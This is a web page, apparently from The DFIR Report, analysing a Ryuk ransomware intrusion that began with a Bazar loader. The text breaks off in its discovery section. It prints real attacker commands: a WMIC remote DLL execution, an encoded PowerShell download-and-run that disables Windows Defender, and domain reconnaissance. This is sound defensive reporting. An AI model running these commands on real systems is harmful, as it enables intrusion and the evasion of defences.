<!doctype html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<link rel="profile" href="https://gmpg.org/xfn/11">
<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />

<title>Ryuk&#039;s Return - The DFIR Report</title>
<link rel="canonical" href="https://thedfirreport.com/2020/10/08/ryuks-return/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Ryuk&#039;s Return - The DFIR Report" />
<meta property="og:description" content="Intro The Ryuk group went from an email to domain wide ransomware in 29 hours and asked for over $6 million to unlock our systems. They used tools such as &hellip; Read More" />
<meta property="og:url" content="https://thedfirreport.com/2020/10/08/ryuks-return/" />
<meta property="og:site_name" content="The DFIR Report" />
<meta property="article:published_time" content="2020-10-08T12:14:59+00:00" />
<meta property="article:modified_time" content="2021-01-24T23:24:31+00:00" />
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2020/10/ryuk.png" />
<meta property="og:image:width" content="1093" />
<meta property="og:image:height" content="587" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:label1" content="Written by">
<meta name="twitter:data1" content="editor">
<meta name="twitter:label2" content="Est. reading time">
<meta name="twitter:data2" content="14 minutes">
<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://thedfirreport.com/#website","url":"https://thedfirreport.com/","name":"The DFIR Report","description":"Real Intrusions by Real Attackers, The Truth Behind the Intrusion","potentialAction":[{"@type":"SearchAction","target":"https://thedfirreport.com/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://thedfirreport.com/2020/10/08/ryuks-return/#primaryimage","inLanguage":"en-US","url":"https://thedfirreport.com/wp-content/uploads/2020/10/ryuk.png","contentUrl":"https://thedfirreport.com/wp-content/uploads/2020/10/ryuk.png","width":1093,"height":587},{"@type":"WebPage","@id":"https://thedfirreport.com/2020/10/08/ryuks-return/#webpage","url":"https://thedfirreport.com/2020/10/08/ryuks-return/","name":"Ryuk's Return - The DFIR Report","isPartOf":{"@id":"https://thedfirreport.com/#website"},"primaryImageOfPage":{"@id":"https://thedfirreport.com/2020/10/08/ryuks-return/#primaryimage"},"datePublished":"2020-10-08T12:14:59+00:00","dateModified":"2021-01-24T23:24:31+00:00","author":{"@id":"https://thedfirreport.com/#/schema/person/b74bd4df805a2739b85903202f6b5838"},"breadcrumb":{"@id":"https://thedfirreport.com/2020/10/08/ryuks-return/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://thedfirreport.com/2020/10/08/ryuks-return/"]}]},{"@type":"BreadcrumbList","@id":"https://thedfirreport.com/2020/10/08/ryuks-return/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"item":{"@type":"WebPage","@id":"https://thedfirreport.com/","url":"https://thedfirreport.com/","name":"Home"}},{"@type":"ListItem","position":2,"item":{"@id":"https://thedfirreport.com/2020/10/08/ryuks-return/#webpage"}}]},{"@type":"Person","@id":"https://thedfirreport.com/#/schema/person/b74bd4df805a2739b85903202f6b5838","name":"editor","image":{"@type":"ImageObject","@id":"https://thedfirreport.com/#personlogo","inLanguage":"en-US","url":"https://secure.gravatar.com/avatar/9627d3871f13290c26ecf861f7715257?s=96&d=mm&r=g","contentUrl":"https://secure.gravatar.com/avatar/9627d3871f13290c26ecf861f7715257?s=96&d=mm&r=g","caption":"editor"},"sameAs":["https://thedfirreport.com"],"url":"https://thedfirreport.com/author/editor/"}]}</script>

<link rel='dns-prefetch' href='//cdn.jsdelivr.net' />
<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel='dns-prefetch' href='//c0.wp.com' />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Comments Feed" href="https://thedfirreport.com/comments/feed/" />
<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.7.2"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://c0.wp.com/c/5.7.2/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
<style id='wp-block-library-inline-css' type='text/css'>
.has-text-align-justify{text-align:justify;}
</style>
<link rel='stylesheet' id='contact-form-7-css' href='https://thedfirreport.com/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='freenews-style-css' href='https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=5.7.2' type='text/css' media='all' />
<style id='freenews-style-inline-css' type='text/css'>
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel='stylesheet' id='font-awesome-css' href='https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/font-awesome.min.css?ver=5.7.2' type='text/css' media='all' />
<link rel='stylesheet' id='freenews-google-fonts-css' href='//fonts.googleapis.com/css?family=Heebo:300,400,700|Arimo&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
<link rel='stylesheet' id='social-logos-css' href='https://c0.wp.com/p/jetpack/9.7/_inc/social-logos/social-logos.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack_css-css' href='https://c0.wp.com/p/jetpack/9.7/css/jetpack.css' type='text/css' media='all' />
<script type='text/javascript' id='jetpack_related-posts-js-extra'>
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type='text/javascript' src='https://c0.wp.com/p/jetpack/9.7/_inc/build/related-posts/related-posts.min.js' id='jetpack_related-posts-js'></script>
<script type='text/javascript' src='https://c0.wp.com/c/5.7.2/wp-includes/js/jquery/jquery.min.js' id='jquery-core-js'></script>
<script type='text/javascript' src='https://c0.wp.com/c/5.7.2/wp-includes/js/jquery/jquery-migrate.min.js' id='jquery-migrate-js'></script>
<script type='text/javascript' src='https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1' id='freenews-global-js'></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/911" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://thedfirreport.com/wp-includes/wlwmanifest.xml" />
<meta name="generator" content="WordPress 5.7.2" />
<link rel='shortlink' href='https://thedfirreport.com/?p=911' />
<link rel="alternate" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2020%2F10%2F08%2Fryuks-return%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2020%2F10%2F08%2Fryuks-return%2F&#038;format=xml" />

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1"></script>
<script>
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>
<script type="text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=AFF8F3805BB89567CF01C9E19C205B46');
</script><style type='text/css'>img#wpstats{display:none}</style>
<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>
<style type="text/css">
				/* If html does not have either class, do not show lazy loaded images. */
				html:not( .jetpack-lazy-images-js-enabled ):not( .js ) .jetpack-lazy-image {
					display: none;
				}
			</style>
<script>
				document.documentElement.classList.add(
					'jetpack-lazy-images-js-enabled'
				);
			</script>
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32" />
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png" />
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png" />
</head>
<body class="post-template-default single single-post postid-911 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden">
<div id="page" class="site">
<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
<header id="masthead" class="site-header">
<div id="main-header" class="main-header">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-24"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
<li class="page_item page-item-2160"><a href="https://thedfirreport.com/services/">Services</a></li>
</ul></div>
</nav>
</div>
</div>
</div>
<div class="main-header-brand">
<div class="header-brand">
<div class="wrap">
<div class="header-brand-content">
<div class="site-branding">
<div class="site-branding-text">
<p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
<p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
</div>
</div>
<div class="header-right">
<div class="header-banner">
</div>
</div>
</div>
</div>
</div>
<div id="nav-sticker">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-24"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
<li class="page_item page-item-2160"><a href="https://thedfirreport.com/services/">Services</a></li>
</ul></div>
</nav>
</div>
</div>
</div>
<div class="clock">
<div id="time"></div>
<div id="date">Sunday, May 23, 2021</div>
</div>
</div>
</div>
</div>
</header>
<div id="content" class="site-content">
<div class="site-content-cell">
<div class="wrap">
<div id="primary" class="content-area">
<main id="main" class="site-main">
<article id="post-911" class="post-911 post type-post status-publish format-standard hentry category-adfind category-bazar category-cobaltstrike category-ransomware category-ryuk tag-adfind tag-bazar tag-cobalt-strike tag-kegtap tag-ryuk entry">
<div class="entry-content-holder">
<header class="entry-header">
<div class="entry-meta">
<span class="cat-links">
<a class="category-color-24" href="https://thedfirreport.com/category/adfind/">adfind</a>
<a class="category-color-27" href="https://thedfirreport.com/category/bazar/">bazar</a>
<a class="category-color-6" href="https://thedfirreport.com/category/cobaltstrike/">cobaltstrike</a>
<a class="category-color-2" href="https://thedfirreport.com/category/ransomware/">ransomware</a>
<a class="category-color-25" href="https://thedfirreport.com/category/ryuk/">ryuk</a>
</span>
</div>
<h1 class="entry-title">Ryuk&#8217;s Return</h1>
<div class="entry-meta">
<span class="posted-on"><a href="https://thedfirreport.com/2020/10/08/ryuks-return/" rel="bookmark"><time class="entry-date published" datetime="2020-10-08T12:14:59+00:00">October 8, 2020</time></a></span> </div>
</header>
<div class="entry-content">
<h3>Intro</h3>
<p>The Ryuk group went from an email to domain wide ransomware in 29 hours and asked for over $6 million to unlock our systems. They used tools such as Cobalt Strike, AdFind, WMI, vsftpd, PowerShell, PowerView, and Rubeus to accomplish their objective.</p>
<p>Ryuk has been one of the most proficient ransomware gangs in the past few years, with the FBI claiming <a href="https://www.zdnet.com/article/fbi-ransomware-victims-have-paid-out-140-million-one-version-has-cost-them-the-most/" target="_blank" rel="noopener noreferrer">$61 million USD</a> having been paid to the group as of February 2020. Earlier in the year, the group grew a little quiet, but that seems to have changed in the past few weeks, with incidents like what occurred at <a href="https://www.bleepingcomputer.com/news/security/uhs-hospitals-hit-by-reported-country-wide-ryuk-ransomware-attack/" target="_blank" rel="noopener noreferrer">UHS hospitals</a>.</p>
<h3>Case Summary</h3>
<p>In this case, the actions began via a loader malware known as Bazar/Kegtap. Reports indicate an email delivery via malspam, which has been creeping up in volume over the month of September.</p>
<p>From the initial execution of the payload, Bazar injects into various processes including explorer.exe and svchost.exe, as well as, spawning cmd.exe processes. The initial goal of this activity was to run discovery using built in Windows utilities like <a href="https://docs.microsoft.com/pt-pt/previous-versions/windows/server/cc784211(v=ws.10)?redirectedfrom=MSDN" target="_blank" rel="noopener noreferrer">nltest</a>, <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754051(v=ws.11)" target="_blank" rel="noopener noreferrer">net group</a>, and the 3rd party utility <a href="https://thedfirreport.com/2020/05/08/adfind-recon/" target="_blank" rel="noopener noreferrer">AdFind</a>.</p>
<p>After the initial discovery activity the Bazar malware stayed relatively quiet, until a second round of discovery the following day. Again, the same tools were employed in the second round of discovery, plus <a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener noreferrer">Rubeus</a>. This time the discovery collection was exfiltrated via FTP to a server hosted in Russia. Next, the threat actor began to move laterally.</p>
<p>It took a few attempts, using various methods, from remote WMI, to remote service execution with PowerShell, until finally landing on Cobalt Strike beacon executable files transferred over SMB to move around the environment. From here forward, the threat actors relied on a Cobalt Strike beacon running on a domain controller as their main operations point.</p>
<p>After picking the most reliable method to move through the environment, the threat actor then proceeded to establish beacons across the enterprise. In preparation for their final objectives, they used PowerShell to disable Windows Defender in the environment.</p>
<p>The server utilized for backups in the domain was targeted first for encryption, with some further preparation completed on the host. However, once the Ryuk ransom executable was transferred over SMB from their domain controller (DC) pivot, it only took one minute to execute it.</p>
<p>At this point Ryuk was transferred to the rest of the hosts in the environment via SMB and executed through an RDP connection from the pivot domain controller. In total, the campaign lasted 29 hours&#8211;from initial execution of the Bazar, to domain wide ransomware. If a defender missed the first day of recon, they would have had a little over 3 hours to respond before being ransomed.</p>
<p>The threat actors requested 600+ bitcoins, which have a market value of around 6+ million USD.</p>
<h2>Timeline</h2>
<p><img loading="lazy" class="alignnone size-full wp-image-1009 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2020/10/Ryuk-Timeline-7.png" alt width="1027" height="2567" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2020/10/Ryuk-Timeline-7.png 1027w, https://thedfirreport.com/wp-content/uploads/2020/10/Ryuk-Timeline-7-120x300.png 120w, https://thedfirreport.com/wp-content/uploads/2020/10/Ryuk-Timeline-7-410x1024.png 410w, https://thedfirreport.com/wp-content/uploads/2020/10/Ryuk-Timeline-7-768x1920.png 768w, https://thedfirreport.com/wp-content/uploads/2020/10/Ryuk-Timeline-7-615x1536.png 615w, https://thedfirreport.com/wp-content/uploads/2020/10/Ryuk-Timeline-7-819x2048.png 819w" data-lazy-sizes="(max-width: 1027px) 100vw, 1027px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2020/10/Ryuk-Timeline-7.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone size-full wp-image-1009" src="https://thedfirreport.com/wp-content/uploads/2020/10/Ryuk-Timeline-7.png" alt="" width="1027" height="2567" srcset="https://thedfirreport.com/wp-content/uploads/2020/10/Ryuk-Timeline-7.png 1027w, https://thedfirreport.com/wp-content/uploads/2020/10/Ryuk-Timeline-7-120x300.png 120w, https://thedfirreport.com/wp-content/uploads/2020/10/Ryuk-Timeline-7-410x1024.png 410w, https://thedfirreport.com/wp-content/uploads/2020/10/Ryuk-Timeline-7-768x1920.png 768w, https://thedfirreport.com/wp-content/uploads/2020/10/Ryuk-Timeline-7-615x1536.png 615w, https://thedfirreport.com/wp-content/uploads/2020/10/Ryuk-Timeline-7-819x2048.png 819w" sizes="(max-width: 1027px) 100vw, 1027px" /></noscript></p>
<p>For a full breakdown of the technical details and threat actor tactics, techniques, and procedures continue into the MITRE ATT&amp;CK breakdown.</p>
<h2>MITRE ATT&amp;CK</h2>
<h3><a>Initial Access</a></h3>
<p>Initial delivery was via email with a link to the Bazar/Kegtap backdoor loader. We downloaded and ran Document-Preview.exe, which connected to 5.182.210[.]145 over 443/https.</p>
<h3><a>Execution</a></h3>
<p>Service execution was used several times to execute scripts and executables during lateral movement.</p>
<p><img loading="lazy" class="alignnone size-full wp-image-1024 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2020/10/service.png" alt width="437" height="56" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2020/10/service.png 437w, https://thedfirreport.com/wp-content/uploads/2020/10/service-300x38.png 300w" data-lazy-sizes="(max-width: 437px) 100vw, 437px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2020/10/service.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone size-full wp-image-1024" src="https://thedfirreport.com/wp-content/uploads/2020/10/service.png" alt="" width="437" height="56" srcset="https://thedfirreport.com/wp-content/uploads/2020/10/service.png 437w, https://thedfirreport.com/wp-content/uploads/2020/10/service-300x38.png 300w" sizes="(max-width: 437px) 100vw, 437px" /></noscript></p>
<p>WMI was used as well in an attempt to execute dlls laterally.</p>
<pre>WMIC /node:"DC.example.domain" process call create "rundll32 C:\PerfLogs\arti64.dll, StartW"</pre>
<p>The threat actors also performed process injection.</p>
<p>
</p>
<h3><img loading="lazy" class="alignnone size-full wp-image-926 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2020/10/inject1.png" alt width="518" height="260" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2020/10/inject1.png 518w, https://thedfirreport.com/wp-content/uploads/2020/10/inject1-300x151.png 300w" data-lazy-sizes="(max-width: 518px) 100vw, 518px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2020/10/inject1.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone size-full wp-image-926" src="https://thedfirreport.com/wp-content/uploads/2020/10/inject1.png" alt="" width="518" height="260" srcset="https://thedfirreport.com/wp-content/uploads/2020/10/inject1.png 518w, https://thedfirreport.com/wp-content/uploads/2020/10/inject1-300x151.png 300w" sizes="(max-width: 518px) 100vw, 518px" /></noscript></h3>
<h3><a>Defense Evasion</a></h3>
<p>Disabling Windows Defender.</p>
<pre>powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA3ADgAMAAxAC8AJwApADsAIABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlAA==</pre>
<p><img loading="lazy" class="alignnone size-full wp-image-1017 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2020/10/d.png" alt width="953" height="196" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2020/10/d.png 953w, https://thedfirreport.com/wp-content/uploads/2020/10/d-300x62.png 300w, https://thedfirreport.com/wp-content/uploads/2020/10/d-768x158.png 768w" data-lazy-sizes="(max-width: 953px) 100vw, 953px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2020/10/d.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone size-full wp-image-1017" src="https://thedfirreport.com/wp-content/uploads/2020/10/d.png" alt="" width="953" height="196" srcset="https://thedfirreport.com/wp-content/uploads/2020/10/d.png 953w, https://thedfirreport.com/wp-content/uploads/2020/10/d-300x62.png 300w, https://thedfirreport.com/wp-content/uploads/2020/10/d-768x158.png 768w" sizes="(max-width: 953px) 100vw, 953px" /></noscript></p>
<h3><a>Discovery</a></h3>
<h4>Day 1</h4>
<p>AdFind and adf.bat were dropped and run minutes after Document-Preview.exe was executed. We&#8217;ve seen adf.bat numerous times and you can read more about it <a href="https://thedfirreport.com/2020/05/08/adfind-recon/" target="_blank" rel="noopener noreferrer">here</a>. The batch file outputs information into the following text files.</p>
<p>
</p>
<figure class="wp-block-image size-large"><img loading="lazy" width="117" height="154" class="wp-image-944 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2020/10/image-5.png" alt data-lazy-src="https://thedfirreport.com/wp-content/uploads/2020/10/image-5.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" width="117" height="154" class="wp-image-944" src="https://thedfirreport.com/wp-content/uploads/2020/10/image-5.png" alt="" /></noscript></figure>
<p>
</p>
<p>Nltest was used to check for Domain trusts</p>
<pre>nltest /domain_trusts /all_trusts</pre>
<p>Net was used to show Domain Admins</p>
<pre>net group "Domain admins" /DOMAIN</pre>
<p>Ping was used to test if systems were up in the environment</p>
<pre>ping hostname.domain.local</pre>
<p>Break down of the process tree of activity from the Bazar loader on day 1.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2020/10/Bazar-Backdoor-2.png"><img loading="lazy" class="alignnone wp-image-1000 size-full jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2020/10/Bazar-Backdoor-2.png" alt width="1103" height="1576" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2020/10/Bazar-Backdoor-2.png 1103w, https://thedfirreport.com/wp-content/uploads/2020/10/Bazar-Backdoor-2-210x300.png 210w, https://thedfirreport.com/wp-content/uploads/2020/10/Bazar-Backdoor-2-717x1024.png 717w, https://thedfirreport.com/wp-content/uploads/2020/10/Bazar-Backdoor-2-768x1097.png 768w, https://thedfirreport.com/wp-content/uploads/2020/10/Bazar-Backdoor-2-1075x1536.png 1075w" data-lazy-sizes="(max-width: 1103px) 100vw, 1103px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2020/10/Bazar-Backdoor-2.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone wp-image-1000 size-full" src="https://thedfirreport.com/wp-content/uploads/2020/10/Bazar-Backdoor-2.png" alt="" width="1103" height="1576" srcset="https://thedfirreport.com/wp-content/uploads/2020/10/Bazar-Backdoor-2.png 1103w, https://thedfirreport.com/wp-content/uploads/2020/10/Bazar-Backdoor-2-210x300.png 210w, https://thedfirreport.com/wp-content/uploads/2020/10/Bazar-Backdoor-2-717x1024.png 717w, https://thedfirreport.com/wp-content/uploads/2020/10/Bazar-Backdoor-2-768x1097.png 768w, https://thedfirreport.com/wp-content/uploads/2020/10/Bazar-Backdoor-2-1075x1536.png 1075w" sizes="(max-width: 1103px) 100vw, 1103px" /></noscript></a></p>
<h4>Day 2</h4>
<p>Afind was run again, and then the threat actor attempted to <a href="https://attack.mitre.org/techniques/T1558/003/" target="_blank" rel="noopener noreferrer">Kerberoast</a> using <a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener noreferrer">Rubeus</a>.</p>
<p>
</p>
<figure class="wp-block-image size-large"><img loading="lazy" class="alignnone size-full wp-image-1014 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2020/10/kerb2.png" alt width="1001" height="106" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2020/10/kerb2.png 1001w, https://thedfirreport.com/wp-content/uploads/2020/10/kerb2-300x32.png 300w, https://thedfirreport.com/wp-content/uploads/2020/10/kerb2-768x81.png 768w" data-lazy-sizes="(max-width: 1001px) 100vw, 1001px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2020/10/kerb2.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone size-full wp-image-1014" src="https://thedfirreport.com/wp-content/uploads/2020/10/kerb2.png" alt="" width="1001" height="106" srcset="https://thedfirreport.com/wp-content/uploads/2020/10/kerb2.png 1001w, https://thedfirreport.com/wp-content/uploads/2020/10/kerb2-300x32.png 300w, https://thedfirreport.com/wp-content/uploads/2020/10/kerb2-768x81.png 768w" sizes="(max-width: 1001px) 100vw, 1001px" /></noscript></figure>
<figure></figure>
<figure class="wp-block-image size-large"><img loading="lazy" class="alignnone size-full wp-image-1015 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2020/10/kerb1.png" alt width="730" height="86" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2020/10/kerb1.png 730w, https://thedfirreport.com/wp-content/uploads/2020/10/kerb1-300x35.png 300w" data-lazy-sizes="(max-width: 730px) 100vw, 730px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2020/10/kerb1.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone size-full wp-image-1015" src="https://thedfirreport.com/wp-content/uploads/2020/10/kerb1.png" alt="" width="730" height="86" srcset="https://thedfirreport.com/wp-content/uploads/2020/10/kerb1.png 730w, https://thedfirreport.com/wp-content/uploads/2020/10/kerb1-300x35.png 300w" sizes="(max-width: 730px) 100vw, 730px" /></noscript></figure>
<p>&nbsp;</p>
<p>After a few false starts during lateral movement failures, the threat actors performed some additional local system recon.</p>
<pre>systeminfo</pre>
<pre>nltest /dclist:</pre>
